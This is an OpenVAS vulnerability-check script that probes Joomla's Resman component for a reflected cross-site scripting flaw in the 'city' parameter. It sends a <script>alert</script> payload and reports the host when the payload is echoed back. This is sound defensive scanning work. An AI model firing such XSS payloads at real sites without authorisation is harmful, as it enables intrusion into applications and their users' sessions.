##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_joomla_com_resman_xss_vuln.nasl 9351 2018-04-06 07:05:43Z cfischer $
#
# Joomla Resman Cross Site Scripting Vulnerability
#
# Authors:
# Madhuri D <dmadhuri@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation will allow attackers to execute arbitrary
web script or HTML in a user's browser session in the context of an affected
site.

Impact Level: Application.";

tag_affected = "Joomla Resman component.";

tag_insight = "The flaw is due to input passed via the 'city' parameter
to 'index.php' (when 'option' is set to 'com_resman' and 'task' is set to
'list') is not properly sanitised before being returned to the user.";

tag_solution = "No solution or patch was made available for at least one year
since disclosure of this vulnerability. Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective
features, remove the product or replace the product by another one.";

tag_summary = "This host is running Joomla Resman component and is prone to cross
site scripting vulnerability.";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802123");
  script_version("$Revision: 9351 $");
  script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:05:43 +0200 (Fri, 06 Apr 2018) $");
  script_tag(name:"creation_date", value:"2011-07-19 14:57:20 +0200 (Tue, 19 Jul 2011)");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_name("Joomla Resman Cross Site Scripting Vulnerability");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/view/103073/joomlaresman-xss.txt");
  script_xref(name : "URL" , value : "http://www.securityhome.eu/exploits/exploit.php?eid=12197195854e201e79bd8c48.80520413");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("joomla_detect.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("joomla/installed");
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  script_tag(name:"solution_type", value:"WillNotFix");
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");
include("version_func.inc");

## Get the port
joomlaPort = get_http_port(default:80);
if(!joomlaPort){
  exit(0);
}

## Get the application directiory
if(!joomlaDir = get_dir_from_kb(port:joomlaPort, app:"joomla")){
  exit(0);
}

sndReq = http_get(item:string(joomlaDir, '/index.php?option=com_resman&task=' +
                 'list&city=<script>alert("OpenVAS-XSS")</script>'), port:joomlaPort);
rcvRes = http_send_recv(port:joomlaPort, data:sndReq);
if(rcvRes =~ "HTTP/1\.. 200" && ';<script>alert("OpenVAS-XSS")</script>' >< rcvRes)
{
  security_message(joomlaPort);
  exit(0);
}
